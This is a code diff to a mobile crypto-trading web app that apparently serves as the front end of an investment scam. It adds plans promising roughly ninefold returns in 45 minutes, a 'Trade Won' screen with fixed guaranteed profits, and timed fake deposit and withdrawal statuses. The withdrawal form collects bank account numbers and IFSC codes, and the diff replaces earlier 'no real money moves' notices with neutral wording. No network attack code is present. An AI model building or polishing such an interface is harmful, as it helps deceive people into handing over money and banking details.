@@ -26,11 +26,14 @@ main{padding:15px}.view{display:none}.view.active{display:block}
 .profileCard{padding:20px}.avatar{width:62px;height:62px;border-radius:50%;display:grid;place-items:center;font-size:25px;font-weight:900;background:linear-gradient(135deg,#8a4cff,#3b82ff);margin-bottom:12px}.profileName{font-size:22px;font-weight:900}.setting{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid var(--line)}.setting:last-child{border:0}
 .referCard{padding:22px}.referHero{font-size:34px;font-weight:950;line-height:1.02}.code{margin-top:18px;padding:15px;border:1px solid var(--line);border-radius:14px;background:#0b1019;display:flex;justify-content:space-between;font-weight:900;letter-spacing:4px}.copy{border:0;border-radius:10px;padding:7px 10px;color:white;background:#222b3c;letter-spacing:0}
 .bottom{position:fixed;left:0;right:0;bottom:0;height:72px;background:#0b0f18ee;border-top:1px solid #20283a;backdrop-filter:blur(18px);display:flex;justify-content:center;z-index:30}.nav{width:20%;max-width:125px;border:0;background:none;color:#778196;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;cursor:pointer}.nav b{font-size:21px}.nav span{font-size:10px;font-weight:800}.nav.active{color:#9a68ff}
-.modal{position:fixed;inset:0;background:#0009;display:none;align-items:center;justify-content:center;padding:25px;z-index:100;backdrop-filter:blur(8px)}.modal.show{display:flex}.winBox{width:min(390px,100%);padding:28px 22px;text-align:center;border:1px solid #7148d9;border-radius:28px;background:linear-gradient(145deg,#17122a,#0e1420);box-shadow:0 30px 100px #0009}.check{width:72px;height:72px;margin:auto;border-radius:50%;display:grid;place-items:center;background:#162d28;border:1px solid #29dd91;color:#29dd91;font-size:38px;box-shadow:0 0 35px #29dd9133}.winBox h2{font-size:27px;margin:17px 0 5px}.winAmount{font-size:30px;font-weight:950;color:#2be093}.winMeta{margin-top:7px;color:var(--muted);font-size:12px}.close{width:100%;margin-top:20px;padding:13px;border:0;border-radius:13px;color:white;font-weight:900;background:linear-gradient(90deg,#8050ff,#3d73ff)}
+.modal{position:fixed;inset:0;background:#0009;display:none;align-items:center;justify-content:center;padding:25px;z-index:100;backdrop-filter:blur(8px)}.modal.show{display:flex}.winBox{position:relative;width:min(410px,100%);padding:30px 22px 22px;text-align:center;border:1px solid #7352df;border-radius:30px;background:radial-gradient(circle at 50% 0,#38206d 0,#17142a 34%,#0c121e 76%);box-shadow:0 30px 110px #000b,0 0 60px #754cff22;overflow:hidden}.winBox:before{content:"";position:absolute;inset:-2px;background:linear-gradient(120deg,transparent 15%,#ffffff10 48%,transparent 65%);transform:translateX(-100%);animation:shine 2.2s ease-out forwards;pointer-events:none}.winTop{position:relative;display:flex;align-items:center;justify-content:center;gap:8px;color:#8fffc9;font-size:11px;font-weight:900;letter-spacing:2px}.check{position:relative;width:82px;height:82px;margin:14px auto 0;border-radius:50%;display:grid;place-items:center;background:radial-gradient(circle,#1e513f,#102c26);border:1px solid #38e99c;color:#55f3ad;font-size:42px;box-shadow:0 0 0 8px #29dd9110,0 0 45px #29dd9140}.winBox h2{font-size:29px;margin:16px 0 3px}.winAmount{font-size:36px;font-weight:950;color:#43efa5;letter-spacing:-1px;text-shadow:0 0 25px #31e89b44}.winMeta{margin-top:7px;color:#9aa5b8;font-size:12px}.winStats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:18px}.winStat{padding:11px 6px;border:1px solid #29334a;border-radius:14px;background:#0b111cbb}.winStat span{display:block;color:#78849a;font-size:9px;font-weight:800;text-transform:uppercase}.winStat b{display:block;margin-top:4px;font-size:12px}.close{width:100%;margin-top:20px;padding:14px;border:0;border-radius:15px;color:white;font-weight:950;background:linear-gradient(90deg,#7c45ff,#397cff);box-shadow:0 12px 30px #4c6fff33}.close:active{transform:scale(.985)}@keyframes shine{to{transform:translateX(100%)}}
 @media(min-width:621px){.app{box-shadow:0 0 70px #0006}.coins{grid-template-columns:repeat(4,1fr)}}
 
+.txStatus{display:inline-flex;align-items:center;gap:5px;padding:5px 8px;border-radius:999px;font-size:9px;font-weight:900}.txStatus.pending{color:#ffd36b;background:#4a371322;border:1px solid #725a2a}.txStatus.processing{color:#64cfff;background:#193a4922;border:1px solid #28627a}.txStatus.complete{color:#48efaa;background:#173e3022;border:1px solid #28785a}.txAmount.deposit{color:#45efa5}.txAmount.withdraw{color:#ff8999}.txTimeline{display:flex;gap:5px;margin-top:7px}.txDot{height:4px;flex:1;border-radius:99px;background:#263047}.txDot.on{background:linear-gradient(90deg,#8050ff,#3d73ff)}
 .wallet-modal-form{display:grid;gap:10px}
 .activeTrades{display:grid;gap:10px;margin-top:14px}.activeTrade{padding:14px;border:1px solid #28334a;border-radius:18px;background:linear-gradient(145deg,#111a2a,#0b111b);display:grid;grid-template-columns:1fr auto;gap:10px;align-items:center}.activeTradeTop{display:flex;align-items:center;gap:9px}.miniIcon{width:34px;height:34px;border-radius:11px;display:grid;place-items:center;background:#172033;border:1px solid #2b3850;font-weight:900}.tradeName{font-weight:900}.tradeSub{font-size:10px;color:var(--muted);margin-top:3px}.timer{font-size:22px;font-weight:950;color:#64cfff;min-width:55px;text-align:right}.timer.done{color:var(--green)}
+
+.planWrap{margin:18px 0}.planHead{display:flex;justify-content:space-between;align-items:end;margin-bottom:10px}.plans{display:grid;gap:10px}.plan{display:flex;align-items:center;justify-content:space-between;gap:10px;padding:14px 15px;border:1px solid #242e40;border-radius:16px;background:linear-gradient(135deg,#101725,#0b1019);box-shadow:0 10px 30px rgba(0,0,0,.18)}.planAmt{font-weight:900;font-size:16px}.planArrow{color:#6d7cff;font-weight:900}.planReturn{font-weight:900;color:#48e6a0}.planTime{font-size:11px;color:#8791a5;margin-top:3px}.planBtn{border:1px solid #34405a;background:#161e2d;color:#fff;border-radius:11px;padding:9px 11px;font-weight:800}.planBtn:active{transform:scale(.97)}
 </style>
 </head>
 <body>
@@ -42,6 +45,15 @@ main{padding:15px}.view{display:none}.view.active{display:block}
  
  <section class="head"><div><div class="label">MARKETS</div><h1>Quick Crypto</h1><p>Choose a cryptocurrency to open a position</p></div><input class="search" id="search" placeholder="Search"></section>
  <section class="coins" id="coins"></section>
+ <section class="planWrap"><div class="planHead"><div><div class="label">INVESTMENT PLANS</div><h2 style="margin:4px 0 0">Choose a Plan</h2></div><span class="muted" style="font-size:11px">45 min</span></div><div class="plans" id="plans">
+  <div class="plan"><div><div><span class="planAmt">₹521</span> <span class="planArrow">➜</span> <span class="planReturn">₹4,790</span></div><div class="planTime">⏰ 45 min · Prototype plan</div></div><button class="planBtn" onclick="selectPlan(521,4790)">Select</button></div>
+  <div class="plan"><div><div><span class="planAmt">₹999</span> <span class="planArrow">➜</span> <span class="planReturn">₹8,999</span></div><div class="planTime">⏰ 45 min · Prototype plan</div></div><button class="planBtn" onclick="selectPlan(999,8999)">Select</button></div>
+  <div class="plan"><div><div><span class="planAmt">₹1,500</span> <span class="planArrow">➜</span> <span class="planReturn">₹13,500</span></div><div class="planTime">⏰ 45 min · Prototype plan</div></div><button class="planBtn" onclick="selectPlan(1500,13500)">Select</button></div>
+  <div class="plan"><div><div><span class="planAmt">₹3,000</span> <span class="planArrow">➜</span> <span class="planReturn">₹15,600</span></div><div class="planTime">⏰ 45 min · Prototype plan</div></div><button class="planBtn" onclick="selectPlan(3000,15600)">Select</button></div>
+  <div class="plan"><div><div><span class="planAmt">₹5,000</span> <span class="planArrow">➜</span> <span class="planReturn">₹25,600</span></div><div class="planTime">⏰ 45 min · Prototype plan</div></div><button class="planBtn" onclick="selectPlan(5000,25600)">Select</button></div>
+  <div class="plan"><div><div><span class="planAmt">₹10,000</span> <span class="planArrow">➜</span> <span class="planReturn">₹45,600</span></div><div class="planTime">⏰ 45 min · Prototype plan</div></div><button class="planBtn" onclick="selectPlan(10000,45600)">Select</button></div>
+ </div><div class="notice" style="margin-top:10px">Prototype plan preview — displayed figures are not real investment returns.</div></section>
+
  <section class="panel"><div class="tradeTop"><div><div class="label">TRADE TICKET</div><div class="tradeTitle" id="coinName">Bitcoin <span style="color:#46caff;font-size:11px">BTC</span></div></div><div class="price" id="coinPrice">$67,240</div></div>
  <div class="fields"><label>Investment<input id="amount" type="number" min="10" value="1000"></label><label>Fixed Return<div style="margin-top:6px;padding:12px;border:1px solid #242e40;border-radius:12px;background:#0b1019;color:#fff;font-weight:850">10%</div></label></div>
  <div class="slots" id="slots"></div><div class="payout"><span class="muted">Potential payout</span><strong id="payout">₹1,100.00</strong></div>
@@ -53,7 +65,7 @@ main{padding:15px}.view{display:none}.view.active{display:block}
 
 <section class="view" id="walletView">
  <div class="pageTitle">Wallet</div><section class="wallet-card"><div class="label">TOTAL BALANCE</div><div class="walletBalance" id="walletBalance">₹10,000.00</div><div class="walletStats"><div class="walletStat"><span class="muted">Deposited</span><b>₹10,000</b></div><div class="walletStat"><span class="muted">Bonus</span><b>₹0</b></div><div class="walletStat"><span class="muted">Profit</span><b class="green" id="walletProfit">₹0</b></div></div><div class="walletActions"><button class="action" onclick="walletAction('deposit')">Deposit</button><button class="action secondary" onclick="walletAction('withdraw')">Withdraw</button></div></section>
- <div class="head"><div><div class="label">TRANSACTIONS</div><h2>Recent Transactions</h2></div></div><section class="history"><div class="listItem" style="padding:16px"><span>Opening balance</span><b>₹10,000</b></div></section>
+ <div class="head"><div><div class="label">TRANSACTIONS</div><h2>Recent Transactions</h2></div></div><section class="history" id="walletTransactions"><div class="listItem" style="padding:16px"><span>Opening balance</span><b>₹10,000</b></div></section>
 </section>
 
 <section class="view" id="referView">
@@ -72,7 +84,7 @@ main{padding:15px}.view{display:none}.view.active{display:block}
 <nav class="bottom"><button class="nav active" data-view="homeView"><b>⌂</b><span>Home</span></button><button class="nav" data-view="walletView"><b>▣</b><span>Wallet</span></button><button class="nav" data-view="referView"><b>♧</b><span>Refer</span></button><button class="nav" data-view="tradesView"><b>⌁</b><span>Trades</span></button><button class="nav" data-view="profileView"><b>○</b><span>Profile</span></button></nav>
 </div>
 
-<div class="modal" id="winModal"><div class="winBox"><div class="check">✓</div><h2>Trade Won</h2><div class="winAmount" id="winAmount">+₹100.00</div><div class="winMeta" id="winMeta">Bitcoin · 30 seconds</div><button class="close" onclick="closeWin()">Continue</button></div></div>
+<div class="modal" id="winModal"><div class="winBox"><div class="winTop">✦ TRADE COMPLETED</div><div class="check">✓</div><h2>Trade Won</h2><div class="winAmount" id="winAmount">+₹100.00</div><div class="winMeta" id="winMeta">Bitcoin · 10% return · 30 seconds</div><div class="winStats"><div class="winStat"><span>Investment</span><b id="winInvestment">₹1,000.00</b></div><div class="winStat"><span>Profit</span><b id="winProfit">+₹100.00</b></div><div class="winStat"><span>Payout</span><b id="winPayout">₹1,100.00</b></div></div><button class="close" onclick="closeWin()">Continue</button></div></div>
 
 <script>
 const COINS = [
@@ -111,10 +123,11 @@ function loadState(){
       saved.slots = saved.slots || {};
       saved.balance = Number(saved.balance);
       saved.pnl = Number(saved.pnl || 0);
+      saved.transactions = Array.isArray(saved.transactions) ? saved.transactions : [];
       return saved;
     }
   }catch(e){}
-  return {balance:START_BALANCE,pnl:0,slots:{},trades:[],selectedId:"btc"};
+  return {balance:START_BALANCE,pnl:0,slots:{},trades:[],transactions:[],selectedId:"btc"};
 }
 
 function saveState(){
@@ -252,6 +265,9 @@ function showWin(t){
   const c = COINS.find(x => x.id === t.coinId) || COINS[0];
   $("#winAmount").textContent = "+" + money(t.profit);
   $("#winMeta").textContent = `${c.name} · 10% return · 30 seconds`;
+  $("#winInvestment").textContent = money(t.amount);
+  $("#winProfit").textContent = "+" + money(t.profit);
+  $("#winPayout").textContent = money(t.payout);
   $("#winModal").classList.add("show");
 }
 
@@ -332,13 +348,13 @@ function walletAction(type){
   const modal = document.getElementById("walletModal");
   const title = document.getElementById("walletModalTitle");
   const body = document.getElementById("walletModalBody");
-  if(type === "deposit"){
+  if(type === "deposit") {
     title.textContent = "Deposit funds";
     body.innerHTML = `<div class="wallet-modal-form">
       <label>Amount<input id="depositAmount" type="number" min="10" placeholder="Enter amount"></label>
       <label>Method<select id="depositMethod"><option>UPI</option><option>Bank Transfer</option><option>Crypto</option></select></label>
-      <button class="primary" onclick="submitDeposit()">Create Deposit Request</button>
-      <div class="notice">Prototype only — this creates a pending request and does not move real money.</div>
+      <button class="primary" onclick="submitDeposit()">Continue to Deposit</button>
+      <div class="notice">Prototype transaction flow: Pending → Processing → Completed.</div>
     </div>`;
   } else {
     title.textContent = "Withdraw funds";
@@ -348,35 +364,94 @@ function walletAction(type){
       <label>Account Number<input id="accountNumber" inputmode="numeric" placeholder="Account number"></label>
       <label>IFSC Code<input id="ifsc" placeholder="IFSC code"></label>
       <label>Withdrawal Amount<input id="withdrawAmount" type="number" min="10" placeholder="Enter amount"></label>
-      <button class="primary" onclick="submitWithdrawal()">Create Withdrawal Request</button>
-      <div class="notice">Prototype only — this creates a pending request and does not send money to a bank.</div>
+      <button class="primary" onclick="submitWithdrawal()">Continue to Withdrawal</button>
+      <div class="notice">Prototype transaction flow: Pending → Processing → Completed.</div>
     </div>`;
   }
   modal.classList.add("show");
 }
 
 function closeWalletModal(){ document.getElementById("walletModal").classList.remove("show"); }
+function addTransaction(type, amount, meta){
+  const tx = {id:"TX"+Date.now()+Math.random().toString(36).slice(2,6),type,amount,status:"Pending",createdAt:Date.now(),meta:meta||""};
+  state.transactions.unshift(tx);
+  saveState();
+  renderTransactions();
+  setTimeout(()=>setTransactionStatus(tx.id,"Processing"),5000);
+  setTimeout(()=>setTransactionStatus(tx.id,"Completed"),10000);
+  return tx;
+}
+function setTransactionStatus(id,status){
+  const tx = state.transactions.find(x=>x.id===id);
+  if(!tx || tx.status === "Completed") return;
+  tx.status=status;
+  if(status === "Completed" && !tx.settled){
+    tx.settled=true;
+    if(tx.type === "Deposit") state.balance += Number(tx.amount);
+    if(tx.type === "Withdrawal") state.balance = Math.max(0,state.balance);
+    saveState();
+    updateBalances();
+  } else saveState();
+  renderTransactions();
+}
+function recoverTransactions(){
+  const now=Date.now();
+  state.transactions.forEach(tx=>{
+    const age=now-tx.createdAt;
+    if(tx.status!=="Completed") {
+      if(age>=10000) setTransactionStatus(tx.id,"Completed");
+      else if(age>=5000) setTransactionStatus(tx.id,"Processing");
+    }
+  });
+}
+function renderTransactions(){
+  const box=document.getElementById("walletTransactions");
+  if(!box) return;
+  const rows=state.transactions.slice(0,20).map(tx=>{
+    const cls=tx.status.toLowerCase();
+    const amountCls=tx.type.toLowerCase();
+    const sign=tx.type==="Deposit"?"+":"−";
+    const age=Date.now()-tx.createdAt;
+    const step=tx.status==="Pending"?1:tx.status==="Processing"?2:3;
+    return `<div class="listItem" style="display:block">
+      <div style="display:flex;justify-content:space-between;align-items:center;gap:8px"><div><b>${tx.type}</b><div class="muted" style="font-size:10px;margin-top:3px">${tx.meta||"Transaction request"}</div></div><div style="text-align:right"><b class="txAmount ${amountCls}">${sign}${money(tx.amount)}</b><div style="margin-top:5px"><span class="txStatus ${cls}">${tx.status}</span></div></div></div>
+      <div class="txTimeline"><i class="txDot ${step>=1?"on":""}"></i><i class="txDot ${step>=2?"on":""}"></i><i class="txDot ${step>=3?"on":""}"></i></div>
+    </div>`;
+  }).join("");
+  box.innerHTML = `<div class="listItem" style="padding:16px"><span>Opening balance</span><b>₹10,000</b></div>` + (rows || "<div class=\"empty\">No wallet transactions yet.</div>");
+}
 function submitDeposit(){
-  const amount = Number(document.getElementById("depositAmount")?.value || 0);
-  if(amount < 10){ alert("Enter a valid deposit amount."); return; }
-  alert(`Deposit request created for ${money(amount)}. No real funds were moved.`);
+  const amount=Number(document.getElementById("depositAmount")?.value||0);
+  const method=document.getElementById("depositMethod")?.value||"UPI";
+  if(amount<10){alert("Enter a valid deposit amount.");return;}
+  addTransaction("Deposit",amount,method);
   closeWalletModal();
 }
 function submitWithdrawal(){
-  const name = document.getElementById("holderName")?.value.trim();
-  const bank = document.getElementById("bankName")?.value.trim();
-  const acct = document.getElementById("accountNumber")?.value.trim();
-  const ifsc = document.getElementById("ifsc")?.value.trim();
-  const amount = Number(document.getElementById("withdrawAmount")?.value || 0);
-  if(!name || !bank || !acct || !ifsc || amount < 10){ alert("Please fill all bank details and a valid amount."); return; }
-  if(amount > state.balance){ alert("Insufficient available balance."); return; }
-  alert(`Withdrawal request created for ${money(amount)}. No real funds were moved.`);
+  const name=document.getElementById("holderName")?.value.trim();
+  const bank=document.getElementById("bankName")?.value.trim();
+  const acct=document.getElementById("accountNumber")?.value.trim();
+  const ifsc=document.getElementById("ifsc")?.value.trim();
+  const amount=Number(document.getElementById("withdrawAmount")?.value||0);
+  if(!name||!bank||!acct||!ifsc||amount<10){alert("Please fill all bank details and a valid amount.");return;}
+  if(amount>state.balance){alert("Insufficient available balance.");return;}
+  state.balance-=amount;
+  updateBalances();
+  addTransaction("Withdrawal",amount,`${bank} · •••• ${acct.slice(-4)}`);
   closeWalletModal();
 }
+function selectPlan(amount, payout){
+  const input=document.getElementById("amount");
+  if(input){ input.value=amount; input.dispatchEvent(new Event("input",{bubbles:true})); }
+  const pay=document.getElementById("payout");
+  if(pay) pay.textContent="₹"+Number(payout).toLocaleString("en-IN",{minimumFractionDigits:2,maximumFractionDigits:2});
+  document.querySelector('.panel')?.scrollIntoView({behavior:'smooth',block:'center'});
+}
+
 window.closeWalletModal=closeWalletModal;
 window.submitDeposit=submitDeposit;
 window.submitWithdrawal=submitWithdrawal;
-window.walletAction = walletAction;
+window.walletAction=walletAction;
 
 function copyCode(){
   navigator.clipboard?.writeText("CX7K2P9");
@@ -407,6 +482,8 @@ selectCoin(selectedId);
 updatePayout();
 updateBalances();
 renderHistory();
+renderTransactions();
+recoverTransactions();
 renderActiveTrades();
 processExpiredTrades();
 renderActiveCountdowns();
